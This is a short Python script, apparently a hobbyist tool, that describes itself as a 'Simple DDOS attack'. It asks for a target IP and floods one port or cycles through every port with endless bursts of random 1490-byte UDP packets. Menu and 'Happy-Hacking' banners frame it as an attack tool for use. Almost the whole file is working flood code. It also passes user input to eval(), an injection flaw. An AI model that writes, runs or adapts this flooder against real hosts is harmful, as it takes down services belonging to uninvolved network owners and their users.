import socket;
import scapy.all as scapy;
import random;
import time;

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
bytes = random._urandom(1490);

def single_port():
    ip = input('\nIP Target :');
    port = eval(input('Port      :'));
    sent = 0;
    
    print(f'\nStarting the attack on {ip} port {port}.....');
    time.sleep(5);
    while True:
        sock.sendto(bytes, (ip, port));
        sent += 1;
        print(f'Sent {sent} packet to {ip} throught port:{port}');

def all_port():
    ip = input('\nIP Target :');
    port = 1;
    sent = 0;
    
    print(f'\nStarting the attack all port on {ip}.....');
    time.sleep(5);
    
    while True:
        sock.sendto(bytes, (ip, port));
        sent += 1;
        port += 1;
        print(f'Sent {sent} packet to {ip} throught port:{port}');
        
        if port == 65534:
            port = 1

def display():
    print('-' * 50);
    print(f'|{"Simple DDOS attack by me..":^48}|')
    print('-' * 50);
    print(f'|{"Option":^48}|');
    print('-' * 50);
    print(f'|{"1. Single Port":^48}|');
    print(f'|{"2. All Port":^48}|');
    print(f'|{" ":^48}|');
    print(f'|{"99. Quit":^48}|');
    print('-' * 50);
    choise = int(input('choise : '));

    return choise; 

def footer():
    print('-' * 50);
    print(f'|{"---Happy-Hacking->.<---":^48}|');
    print('-' * 50);